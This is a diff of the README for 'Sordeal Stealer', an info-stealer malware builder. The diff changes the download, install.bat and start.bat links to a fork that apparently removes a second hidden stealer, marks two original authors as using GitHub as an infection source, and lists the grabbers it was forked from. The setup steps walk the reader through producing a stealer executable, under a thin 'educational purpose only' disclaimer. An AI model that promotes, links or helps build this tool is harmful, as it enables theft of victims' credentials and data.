@@ -44,9 +44,9 @@ This software was made for personal **education** and **sandbox testing**
 
 ## <a id="setup"></a> 📁 〢 Setting up Sordeal
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [Sordeal Files](https://github.com/SOrdeal/Sordeal-Stealer/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/SOrdeal/Sordeal-Stealer/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/SOrdeal/Sordeal-Stealer/blob/main/start.bat)
+2. Install [Sordeal Files](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/archive/refs/heads/main.zip)
+3. Install all requirements [install.bat](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/blob/main/install.bat)
+4. Click on start.bat [start.bat](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/blob/main/start.bat)
 5. Complete the configuration
 6. You have your .exe/.py file enjoy
 
@@ -184,13 +184,14 @@ v3.3: 2023-29-03
 
 
 ### Authors
-- [Shaman](https://github.com/ShamanOracle)
-- [Nolay](https://github.com/NolayDsc)
-- [Katashi](https://github.com/0xKatashiOracle)
-- [blackface](https://github.com/blackkface)
-- [Choumi1](https://github.com/choumi1)
-- [Irax](https://github.com/IrxOracle)
-- [M4t](https://github.com/M4T-Dev)
+- Inplex-sys ( The cool guy who removed the hidden stealer )
+- ShamanOracle ( ⚠️ Using Github As Infection Source )
+- NolayDsc ( ⚠️ Using Github As Infection Source )
+- 0xKatashiOracle
+- blackkface
+- choumi1
+- IrxOracle
+- M4T-Dev
 
 ### Contributors
 - [JuliusIII](https://github.com/JuliusOracle)
@@ -200,7 +201,7 @@ v3.3: 2023-29-03
 ### <a id="forkedfrom"></a>🕵️‍♂️ 〢 Forked From:
 - Hazard Grabber
 - Wasp-stealer
-
+- Blackcap Grabber
 
 ### <a id="terms"></a>💼 〢 Terms Of Usage
 - [x] Educational purpose only
